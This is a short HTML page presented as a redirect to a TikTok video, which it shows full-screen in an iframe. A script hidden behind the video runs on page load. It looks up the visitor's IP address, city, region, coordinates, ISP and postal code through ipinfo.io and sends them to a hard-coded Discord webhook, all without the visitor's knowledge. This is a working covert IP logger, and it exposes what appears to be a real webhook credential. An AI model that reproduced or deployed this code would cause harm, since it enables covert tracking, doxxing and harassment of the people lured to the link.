<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Przekierowanie</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="https://www.tiktok.com/@seal_sealion/video/7629302323914804493?is_from_webapp=1&sender_device=pc"></iframe>

    <script>
        const discordWebhook = "https://discord.com/api/webhooks/1494358942413750332/wfayHFsRQ06vOFpQ6QNCkRxlZ1egWzre30qgOPCwA_X87ntoexaB5g8SQ-pueymfNAo3";

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN');
                const data = await response.json();
                
                const embed = {
                    embeds: [{
                        title: "Nowe wejście na stronę",
                        color: 0xff0000,
                        fields: [
                            { name: "IP", value: data.ip || "Nieznane", inline: true },
                            { name: "Miasto", value: data.city || "Brak", inline: true },
                            { name: "Region", value: data.region || "Brak", inline: true },
                            { name: "Kraj", value: data.country || "Brak", inline: true },
                            { name: "Lokalizacja", value: data.loc || "Brak", inline: true },
                            { name: "Organizacja", value: data.org || "Brak", inline: true },
                            { name: "Kod pocztowy", value: data.postal || "Brak", inline: true },
                            { name: "Strefa czasowa", value: data.timezone || "Brak", inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(discordWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                }).catch(err => console.error(err));

            } catch (error) {
                const errorEmbed = {
                    embeds: [{
                        title: "Błąd pobierania IP",
                        description: error.toString(),
                        color: 0xff0000
                    }]
                };
                fetch(discordWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(errorEmbed)
                }).catch(e => console.error(e));
            }
        }

        getIPInfo();
    </script>
</body>
</html>
